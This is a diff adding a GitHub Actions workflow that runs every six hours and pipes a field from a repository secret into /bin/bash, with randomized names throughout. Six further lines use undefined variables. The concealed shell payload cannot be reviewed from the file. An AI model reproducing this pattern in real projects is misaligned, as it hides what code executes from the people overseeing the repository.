@@ -1,0 +1,25 @@
+name: mengguml
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengguml
+        env:
+          cccbg701: ${{ secrets.cccbg701 }}
+        run: |
+          echo $cccbg701 | jq -r .pzw855 | /bin/bash
+          echo $b82737 | jq -r .l6 | /bin/bash
+          echo $ayw02 | jq -r .ccfup36 | /bin/bash
+          echo $exvo3 | jq -r .pe2576 | /bin/bash
+          echo $iny748 | jq -r .oqtgx61020 | /bin/bash
+          echo $c531 | jq -r .ildmz9 | /bin/bash
+          echo $j4883 | jq -r .ddb52 | /bin/bash
+
